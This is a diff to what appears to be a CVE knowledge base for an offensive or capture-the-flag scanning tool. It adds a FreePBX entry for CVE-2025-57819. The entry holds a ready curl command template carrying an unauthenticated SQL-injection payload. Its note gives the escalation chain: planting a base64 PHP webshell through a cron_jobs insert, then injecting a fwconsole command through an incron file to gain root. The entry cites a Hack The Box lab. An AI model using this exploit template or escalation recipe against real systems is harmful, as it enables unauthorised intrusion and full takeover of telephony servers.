@@ -2,6 +2,15 @@
   "_comment": "Web-application version -> CVE knowledge base with guided (confirm-gated) exploitation hints. match: lowercased tokens that must all appear in the fingerprint (product/name/banner/notes). range: optional cve.satisfies() spec; empty means version-agnostic lead (verify the version). exploit: a ready command template with {TARGET}/{PORT} placeholders. note: what it does / what to grab.",
   "entries": [
     {
+      "match": ["freepbx"],
+      "range": "",
+      "cve": "CVE-2025-57819",
+      "severity": "critical",
+      "name": "FreePBX endpoint unauthenticated SQLi -> RCE",
+      "exploit": "curl -s -G 'http://{TARGET}:{PORT}/admin/ajax.php' --data-urlencode 'module=FreePBX\\modules\\endpoint\\ajax' --data-urlencode 'command=model' --data-urlencode 'template=x' --data-urlencode 'model=model' --data-urlencode \"brand=x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -\"",
+      "note": "Unauth error-based SQLi in the endpoint module ajax handler (brand param); the module path bypasses the auth check. Stacked writes enabled -> INSERT a cron_jobs webshell dropper (echo <base64 php>|base64 -d >/var/www/html/shell.php) -> RCE as asterisk (~60s). Then incron: write /var/spool/asterisk/incron/api.fwconsole-commands.<base64(zlib(json[cmd,txn]))> -> the fwconsole-commands hook runs `fwconsole $cmd` as root -> command injection to root. Affects FreePBX 15/16/17 endpoint module. (HTB Connected.)"
+    },
+    {
       "match": ["grafana"],
       "range": ">=8.0.0,<8.3.1",
       "cve": "CVE-2021-43798",
